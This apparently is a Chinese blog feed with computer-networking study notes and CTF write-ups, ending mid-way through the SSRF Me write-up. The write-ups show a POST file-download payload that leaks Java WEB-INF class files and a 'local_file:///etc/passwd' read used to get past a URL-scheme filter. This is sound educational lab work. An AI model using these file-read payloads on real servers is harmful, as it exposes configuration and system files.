alt="image-20240305093038757"></p><h2 id="域名解析过程"><a href="#域名解析过程" class="headerlink" title="域名解析过程"></a>域名解析过程</h2><p>可以参考这篇文章：<a href="https://blog.csdn.net/m0_37263637/article/details/85157611">域名分级与域名解析过程(DNS)-CSDN博客</a></p><p>域名解析分为两种查询：</p><ul><li><p>递归查询</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305093323157.png" alt="image-20240305093323157"></p></li><li><p>迭代查询</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305093347626.png" alt="image-20240305093347626"></p></li></ul><p>这两种查询的区别就是客户角色不同，递归是每一种服务器都要做查询用户，而迭代就一直是本地域名服务器做查询用户</p><h2 id="高速缓存"><a href="#高速缓存" class="headerlink" title="高速缓存"></a>高速缓存</h2><p>这是为了提高DNS查询效率的方法，比如最近查询过的域名会存放在本地域名服务器</p><h1 id="文件传送协议"><a href="#文件传送协议" class="headerlink" title="文件传送协议"></a>文件传送协议</h1><ul><li>文件传送协议FTP(FileTransfer Protocol)：提供不同种类主机系统(硬、软件体系等都可以不同)之间的文件传输能力。</li><li>简单文件传送协议TFTP(Trivial File Transfer Protocol)</li></ul><h2 id="FTP服务端和用户端"><a href="#FTP服务端和用户端" class="headerlink" title="FTP服务端和用户端"></a>FTP服务端和用户端</h2><blockquote><p> FTP是基于客户&#x2F;服务器(C&#x2F;S)的协议。</p><p>用户通过一个客户机程序连接至在远程计算机上运行的服务器程序。</p><p>依照 FTP协议提供服务，进行文件传送的计算机就是FTP服务器。</p><p>连接FTP服务器，遵循FTP协议与服务器传送文件的电脑就是FTP客户端</p></blockquote><h2 id="FTP工作原理"><a href="#FTP工作原理" class="headerlink" title="FTP工作原理"></a>FTP工作原理</h2><ul><li><p>登陆</p><p>知道ftp服务器地址后有两种登陆方式，一种是用户名&amp;密码登陆方式，另一种是匿名登陆</p><blockquote><p>互连网中有很大一部分FTP 服务器被称为“匿名”(Anonymous)FTP服务器。这类服务器的目的是向公众提供文件拷贝服务，不要求用户事先在该服务器进行登记注册，也不用取得FTP服务器的授权。Anonymous(匿名文件传输)能够使用户与远程主机建立连接并以匿名身份从远程主机上拷贝文件，而不必是该远程主机的注册用户。用户使用特殊的用户名“anonymous”登陆FTP服务，就可访问远程主机上公开的文件。这样可以减少服务器的压力。</p></blockquote></li></ul><p>FTP使用TCP实现可靠传输</p><p>FTP的服务器进程分为两种：</p><ul><li>一个主进程：负责接收请求</li><li>n个从属进程：去处理用户请求</li></ul><p>这是ftp传输的过程及其使用的端口号：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305095147480.png" alt="image-20240305095147480"></p><p>ftp传输的文件有两种模式：</p><ul><li>文本模式：ASCII模式，以文本序列传输数据</li><li>二进制模式：Binary模式，以二进制序列传输数据</li></ul><h1 id="电子邮件"><a href="#电子邮件" class="headerlink" title="电子邮件"></a>电子邮件</h1><h2 id="信息格式"><a href="#信息格式" class="headerlink" title="信息格式"></a>信息格式</h2><ul><li><p>信封：例如<a href="mailto:&#x78;&#120;&#120;&#x40;&#49;&#54;&#51;&#x2e;&#x63;&#x6f;&#109;">&#x78;&#120;&#120;&#x40;&#49;&#54;&#51;&#x2e;&#x63;&#x6f;&#109;</a></p></li><li><p>内容</p><ul><li><p>首部</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305124931354.png" alt="image-20240305124931354"></p></li><li><p>主体</p><p>就是邮件内容了。</p></li></ul></li></ul><h2 id="组成结构"><a href="#组成结构" class="headerlink" title="组成结构"></a>组成结构</h2><p>邮件发送采用C&#x2F;S模式，邮件服务器既可以做服务器也可以做发送方客户端，下面是一个示意图：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305130100685.png" alt="image-20240305130100685"></p><p>邮件是存放在邮件服务器的缓存当中</p><h2 id="SMTP协议"><a href="#SMTP协议" class="headerlink" title="SMTP协议"></a>SMTP协议</h2><p>SMTP规定了14条命令(几个字母)和21种应信息(三位数字代码+简单文字说明)。</p><p>用于TCP连接的端口号一般是25端口</p><p><strong>SMTP通信的三个阶段</strong></p><p>连接建立&#x3D;》邮件传送&#x3D;》连接释放</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305131325496.png" alt="image-20240305131325496"></p><p><strong>SMTP的缺点</strong></p><ol><li><p>SMTP不能传送可执行文件或者其他二进制对象。</p></li><li><p>SMTP仅限于传送7位ASCII码，不能传送其他非英语国家的文字。</p></li><li><p>SMTP服务器会拒绝超过一定长度的邮件。</p></li></ol><p><strong>MIME</strong></p><p>也叫通用因特网邮件扩充MIME，用来弥补SMTP协议的不足，MIME是电子邮件可以传输各种各样的数据</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305131619206.png" alt="image-20240305131619206"></p><p>现在也不光为邮件服务使用，也已经为浏览器使用，传输数据的时候就会声明传输的数据是什么MIME类型，http的请求头会有一栏<strong>content-type</strong>就是标识数据的MIME类型</p><h2 id="邮局协议POP3"><a href="#邮局协议POP3" class="headerlink" title="邮局协议POP3"></a>邮局协议POP3</h2><p>该协议也采用TCP连接，端口号一般为110，也是C&#x2F;S模式，作用在最后用户读取邮件内容的时候</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305132443641.png" alt="image-20240305132443641"></p><p>其工作方式有两种：</p><ul><li>下载并保留(在服务器)</li><li>下载并删除</li></ul><h2 id="网际报文存取协议IMAP"><a href="#网际报文存取协议IMAP" class="headerlink" title="网际报文存取协议IMAP"></a>网际报文存取协议IMAP</h2><p>IMAP协议比POP协议复杂。当用户Pc上的IMAP客户程序打开IMAP服务器的邮箱时，用户可以看到邮箱的首部，若用户需要打开某个邮件，该邮件才上传到用户的计算机上。</p><p>IMAP可以让用户在不同的地方使用不同的计算机随时上网阅读处理邮件，还允许只读取邮件中的某一个部分<br>(先看正文，有WiFi的时候再下载附件)。</p><p>该协议也是和POP3一样作用在最后一个环节</p><h2 id="基于万维网的电子邮件"><a href="#基于万维网的电子邮件" class="headerlink" title="基于万维网的电子邮件"></a>基于万维网的电子邮件</h2><p>现在很少专门去下载发送邮件的软件，我们直接在网上输入邮箱写上内容就可以发送邮件了，是基于http协议去连接别的厂商的邮件服务器，比如通过http协议用户代理连接到网易邮件服务器</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305132800061.png" alt="image-20240305132800061"></p><h1 id="万维网和HTTP协议"><a href="#万维网和HTTP协议" class="headerlink" title="万维网和HTTP协议"></a>万维网和HTTP协议</h1><h2 id="URL和URI"><a href="#URL和URI" class="headerlink" title="URL和URI"></a>URL和URI</h2><p><strong>URI</strong>叫做统一资源标识符，<strong>URL</strong>（统一资源定位符）是其中的一种。</p><p>HTTP 请求的内容通称为”资源”。”资源“这一概念非常宽泛，它可以是一份文档，一张图片，或所有其他你能够想到的格式。每个资源都由一个 <strong>URI</strong> 来进行标识。</p><p>一般情况下，资源的名称和位置由同一个 URL（统一资源定位符，它是 URI 的一种）来标识。也有某些特殊情况，资源的名称和位置由不同的 URI 进行标识：例如，待请求的资源希望客户端从另外一个位置访问它。我们可以使用一个特定的首部字段，<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Alt-Svc"><code>Alt-Svc</code></a>，来指示这种情况。</p><p><strong>URL</strong> 由多个必须或可选的组件构成。下面给出了一个复杂的 URL：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://www.example.com:80/path/to/myfile.html?key1=value1&amp;key2=value2#SomewhereInTheDocument<br></code></pre></td></tr></table></figure><p><strong>URL的结构如下：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">URI=scheme:[//authority]path[?query][#fragment]<br>authority组件又分为三部分：[userinfo@]host[:port]<br>该组件中，userinfo用的比较少，一般HTTP以匿名的方式获取数据，如果要进行身份验证，格式为 username:password ,以@结尾<br></code></pre></td></tr></table></figure><p><strong>URN</strong> 是另一种形式的 URI，它通过特定命名空间中的唯一名称来标识资源。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">urn:isbn:9780141036144<br>urn:ietf:rfc:7230<br></code></pre></td></tr></table></figure><h2 id="HTTP请求过程"><a href="#HTTP请求过程" class="headerlink" title="HTTP请求过程"></a>HTTP请求过程</h2><p>HTTP请求具体过程示例图：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305133740408.png" alt="image-20240305133740408"></p><h2 id="HTTP连接方式"><a href="#HTTP连接方式" class="headerlink" title="HTTP连接方式"></a>HTTP连接方式</h2><p>http协议本身是一个无状态协议，如果需要识别用户的话可以利用Cookie</p><p>连接方式：</p><ul><li><p>持久连接(Keep-alive)</p><p>只需要进行一次TCP连接，后续再发送新数据不需要重新建立连接</p><ul><li><p>非流水线</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305134328129.png" alt="image-20240305134328129"></p><p>这就是非流水线式的连接，要在收到响应后才能继续下一次请求</p></li><li><p>流水线</p><p>就是可以同时发送多个请求报文不需要逐次等待</p></li></ul></li><li><p>非持久连接(Close)</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305134223174.png" alt="image-20240305134223174"></p><p>即每次发送一次新的数据都需要重新建立连接，比较耗时</p></li></ul><h2 id="HTTP请求报文结构"><a href="#HTTP请求报文结构" class="headerlink" title="HTTP请求报文结构"></a>HTTP请求报文结构</h2><p>这里放一张图就行了，这是get请求的报文结构</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305134824112.png" alt="image-20240305134824112"></p>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络学习(1)</title>
      <link href="/2024/03/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0-1/"/>
      <url>/2024/03/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0-1/</url>
      
        <content type="html"><![CDATA[<p><strong>这里根据王道考研视频来学习，啃书太折磨了()</strong></p><h1 id="性能指标"><a href="#性能指标" class="headerlink" title="性能指标"></a>性能指标</h1><h2 id="速率"><a href="#速率" class="headerlink" title="速率"></a>速率</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305004320101.png" alt="image-20240305004320101"></p><h2 id="带宽"><a href="#带宽" class="headerlink" title="带宽"></a>带宽</h2><p>计算机网络中，带宽用来表示网络的通信线路传送数据的能力，通常是指单位时间内从网络中的某一点到另一点所能通过的“最高数据率”。单位是“比特每秒”，b&#x2F;s，kb&#x2F;s，Mb&#x2F;s，Gb&#x2F;s。网络设备所支持的最高速度。</p><p>也就是理论上的最高速率。</p><p>带宽增大也就是发送的速率变快了，并不影响传播的速率。</p><h2 id="吞吐量"><a href="#吞吐量" class="headerlink" title="吞吐量"></a>吞吐量</h2><p>表示在单位时间内通过某个网络(或信道、接口)的数据量。单位b&#x2F;s，kb&#x2F;s，Mb&#x2F;s等。</p><p>吞吐量受网络的带宽或网络的额定速率的限制。</p><h2 id="时延"><a href="#时延" class="headerlink" title="时延"></a>时延</h2><p>指数据(报文&#x2F;分组&#x2F;比特流)从网络(或链路)的一端传送到另一端所需的时间。也叫延迟或迟延。单位是s。</p><p>时延又分为4种：</p><ul><li>发送时延(传输时延)：发送时延&#x3D;数据长度&#x2F;信道带宽(发送速率)</li><li>传播时延：取决于电磁波传播速度和链路长度，传播时延&#x3D;信道长度&#x2F;电磁波在信道上的传播速率</li><li>排队时延：等待输出、输入链路可用(例如排队等安检)</li><li>处理时延：检错找出口(例如安检时的过程要的时间)</li></ul><h2 id="时延带宽积"><a href="#时延带宽积" class="headerlink" title="时延带宽积"></a>时延带宽积</h2><p>时延带宽积(bit)&#x3D;传播时延(s) X 带宽(b&#x2F;s)</p><p>时延带宽积又称为以比特为单位的链路长度</p><p>就是链路上的容量</p><h2 id="往返时延RTT"><a href="#往返时延RTT" class="headerlink" title="往返时延RTT"></a>往返时延RTT</h2><p>从发送方发送数据开始，到发送方收到接收方的确认(接收方收到数据后立即发送确认)，总共经历的时延。</p><p>这里可以用ping来看到往返时延</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305084247521.png" alt="image-20240305084247521"></p><p>上面的时间就是往返时延</p><p>RTT越大，在收到确认之前，可以发送的数据越多，因为收到确认前的时间越长</p><p>RTT包括以下两部分：</p><ul><li>往返传播时延&#x3D;传播时延*2（主要就是这个）</li><li>末端处理时间</li></ul><h2 id="利用率"><a href="#利用率" class="headerlink" title="利用率"></a>利用率</h2><ul><li>信道利用率：信道利用率&#x3D;有数据通过时间&#x2F;(有+无)数据通过时间</li><li>网络利用率：信道利用率的加权平均值</li></ul><p><strong>时延和利用率的关系图</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305084703782.png" alt="image-20240305084703782"></p><p>这就相当于高速车辆越多行驶越缓慢</p><h1 id="OSI七层模型"><a href="#OSI七层模型" class="headerlink" title="OSI七层模型"></a>OSI七层模型</h1><p>OSI七层模型偏理论，并不在实际中运用，因为该模型十分理想，且效率低但对我们了解网络模型有帮助</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240304110839603.png" alt="image-20240304110839603"></p><p>下面是一个利用OSI七层模型通过中间系统进行信息传输的示例图</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240304111508504.png" alt="image-20240304111508504"></p><p>除了物理层，每一层都会对数据进行封装再往下一层传输，信息处理的过程示例图如下，也就是打包和拆包的过程</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240304111743194.png" alt="image-20240304111743194"></p><h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h2><p>能和用户交互产生网路流量的程序</p><p>典型应用层服务：</p><p>文件传输(FTP)</p><p>电子邮件(SMTP)</p><p>万维网(HTTP)</p><p>……</p><h2 id="表示层"><a href="#表示层" class="headerlink" title="表示层"></a>表示层</h2><p>用户处理两个通信系统中交换信息的表示方式</p><p>功能一：数据格式变换</p><p>功能二：数据加密解密</p><p>功能三：数据压缩和恢复</p><h2 id="会话层"><a href="#会话层" class="headerlink" title="会话层"></a>会话层</h2><p>向表示层实体&#x2F;用户进程提供建立连接并在连接上有序地传输数据。</p><p>这是会话也是建立同步</p><p>功能一：建立、管理、终止会话</p><p>功能二：使用校验点可使会话在通信失效时从校验点&#x2F;同步点继续恢复通信，实现数据同步。适用于传输大文件</p><h2 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h2><p>负责主机中两个进程的通信，即&#x3D;&#x3D;端到端&#x3D;&#x3D;的通信(也就是端口号那种)。传输单位是报文段或用户数据报。</p><p>功能一:可靠传输、不可靠传输</p><p>功能二:差错控制</p><p>功能三:流量控制</p><p>功能四:复用分用</p><blockquote><p>复用:多个应用层进程可同时使用下面传输层的服务。</p><p>分用:传输层把收到的信息分别交付给上面应用层中相应的进程，</p></blockquote><h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><p>主要任务是把分组从源端传到目的端，为分组交换网上的不同主机提供通信服务，网络层传输单位是数据报。</p><p>功能一:路由选择(最佳路径)</p><p>功能二:流量控制</p><p>功能三:差错控制</p><p>功能四:拥塞控制</p><blockquote><p>若所有结点都来不及接受分组，而要丢弃大量分组的话，网络就处于拥塞状态。因此要采取一定措施，缓解这种拥塞，也就是拥塞控制。</p></blockquote><p>该层主要协议：</p><p>IP、IPX、ICMP、IGMP、ARP、RARP、OSPF</p><h2 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h2><p>主要任务是把网络层传下来的数据报组装成帧，数据链路层&#x2F;链路层的传输单位是帧。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305002727144.png" alt="image-20240305002727144"></p><h2 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h2><p>主要任务是在物理媒体上实现比特流的透明传输，物理层传输单位是比特，</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305002907189.png" alt="image-20240305002907189"></p><h1 id="TCP-IP参考模型"><a href="#TCP-IP参考模型" class="headerlink" title="TCP&#x2F;IP参考模型"></a>TCP&#x2F;IP参考模型</h1><p>下面是一个TCP&#x2F;IP模型和起协议栈的对应图：<br><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305003141069.png" alt="image-20240305003141069"></p><p><strong>TCP&#x2F;IP和OSI的不同之处：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305003538566.png" alt="image-20240305003538566"></p><blockquote><p>面向连接：分为三个阶段，第一阶段建立连接，第二阶段进行数据传输，第三阶段释放连接</p><p>无连接：直接进行数据传输</p></blockquote><h1 id="5层参考模型"><a href="#5层参考模型" class="headerlink" title="5层参考模型"></a>5层参考模型</h1><p>综合了OSI和TCP&#x2F;IP的优点</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305003806547.png" alt="image-20240305003806547"></p><p>5层模型的封装和解封装过程如下：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305003949042.png" alt="image-20240305003949042"></p>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buu做题记录1</title>
      <link href="/2024/03/02/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%951/"/>
      <url>/2024/03/02/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%951/</url>
      
        <content type="html"><![CDATA[<h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><p>题目是一个登陆界面，试了一下admin&#x2F;admin没反应</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240302113439732.png" alt="image-20240302113439732"></p><p>点击帮助文档出现一个java语句<strong>java.io.FileNotFoundException:{help.docx}</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240302113616226.png" alt="image-20240302113616226"></p><p>应该就是啥都没有，查看源码他的链接是这样的</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240302113731820.png" alt="image-20240302113731820"></p><p>没啥思路去看别的师傅的wp，这里涉及到一个WEB-INF&#x2F;xml的文件泄露，因为这题的环境是java的web应用</p><p>参考文章：<a href="https://www.cnblogs.com/darkcyan/p/17668377.html">https://www.cnblogs.com/darkcyan/p/17668377.html</a></p><p><strong>WEB-INF知识</strong></p><p>WEB-INF是Java的WEB应用的安全目录。所谓安全就是客户端无法访问，只有服务端可以访问的目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p><p>这是一些主要敏感目录：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则<br>/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在.jar文件中<br>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件<br>/WEB-INF/database.properties：数据库配置文件<br></code></pre></td></tr></table></figure><p>然后就去下载页面去看这些敏感目录的内容，先去看WEB-INF&#x2F;web.xml</p><p>不过这里的下载页面很奇怪，get请求的时候是下载不了的，改成post就可以了，上面的help文档也是</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240302115936170.png" alt="image-20240302115936170"></p><p>改成post去看一下文件内容</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240302120029103.png" alt="image-20240302120029103"></p><p>这是从别的师傅那找来的相关标签的用法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;servlet-class&gt;  这个就是指向我们要注册的servlet 的类地址, 要带包路径<br><br>&lt;servlet-mapping&gt;  是用来配置我们注册的组件的访问路径,里面包括两个节点<br>一个是&lt;servlet-name&gt;，这个要与前面写的servlet一致<br>另一个是&lt;url-pattern&gt;，配置这个组件的访问路径<br><br>&lt;servlet-name&gt; 这个是我们要注册servlet的名字,一般跟Servlet类名有关<br><br>举个例子<br>&lt;servlet&gt;<br>    &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;<br>    &lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;<br>&lt;/servlet&gt;<br></code></pre></td></tr></table></figure><p>然后上面的web.xml文件我们看到了flag相关的类，然后有个路径我试着去访问了一下返回500状态码，那就要去找FlagController.class文件了</p><p>因为WEB-INF&#x2F;classes里面包含了所有class文件，所以我们从该目录开始然后通过包名去写路径即可拿到想要的class文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/Download<br><br>POST:<br>filename=WEB-INF/classes/com/wm/ctf/FlagController.class<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240302121422866.png" alt="image-20240302121422866"></p><p>然后将其中的base64字符串拿去解码即可获得flag</p><h1 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h1><p>题目进去就看到一段很丑陋的源代码，看源码也没有格式化好</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240303014938284.png" alt="image-20240303014938284"></p><p>直接去让gpt给我美化了一下：</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#! /usr/bin/env python</span><br><span class="hljs-comment"># encoding=utf-8</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> json<br><br>reload(sys)<br>sys.setdefaultencoding(<span class="hljs-string">&#x27;latin1&#x27;</span>)<br><br>app = Flask(__name__)<br>secert_key = os.urandom(<span class="hljs-number">16</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, action, param, sign, ip</span>):<br>        self.action = action<br>        self.param = param<br>        self.sign = sign<br>        self.sandbox = md5(ip)<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">not</span> os.path.exists(self.sandbox)):  <span class="hljs-comment"># SandBox For Remote_Addr</span><br>            os.mkdir(self.sandbox)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Exec</span>(<span class="hljs-params">self</span>):<br>        result = &#123;&#125;<br>        result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>        <span class="hljs-keyword">if</span> (self.checkSign()):<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                tmpfile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>)<br>                resp = scan(self.param)<br>                <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>):<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span> resp<br>                    tmpfile.write(resp)<br>                    tmpfile.close()<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()<br>            <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span>:<br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>            result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span><br>        <span class="hljs-keyword">return</span> result<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">checkSign</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> (getSign(self.action, self.param) == self.sign):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># generate Sign For Action Scan.</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">geneSign</span>():<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-keyword">return</span> getSign(action, param)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/De1ta&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge</span>():<br>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>))<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>))<br>    ip = request.remote_addr<br>    <span class="hljs-keyword">if</span>(waf(param)):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span><br>    task = Task(action, param, sign, ip)<br>    <span class="hljs-keyword">return</span> json.dumps(task.Exec())<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;code.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).read()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan</span>(<span class="hljs-params">param</span>):<br>    socket.setdefaulttimeout(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> urllib.urlopen(param).read()[:<span class="hljs-number">50</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Connection Timeout&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getSign</span>(<span class="hljs-params">action, param</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params">content</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(content).hexdigest()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">param</span>):<br>    check = param.strip().lower()<br>    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.debug = <span class="hljs-literal">False</span><br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br><br></code></pre></td></tr></table></figure><p>根据题目的提示flag在.&#x2F;flag.txt里面</p><p>审计源码发现param和action是我们可控的参数，在Exec函数里，在通过checkSign()的校验之后，如果cookie中的aciton包含scan就写入文件，如果包含read就读取文件</p><p>这里由于waf过滤了gopher和file，就不能通过param直接传参读文件，不过urllib.urlopen()这个方法有两种方法读取本地文件</p><ul><li>直接写文件名</li><li>利用local_file协议：该协议和file的用法一样，local_file&#x2F;&#x2F;&#x2F;etc&#x2F;passwd，但是也被过滤了</li></ul><p>所以这里在param填文件名写入文件</p><p><img 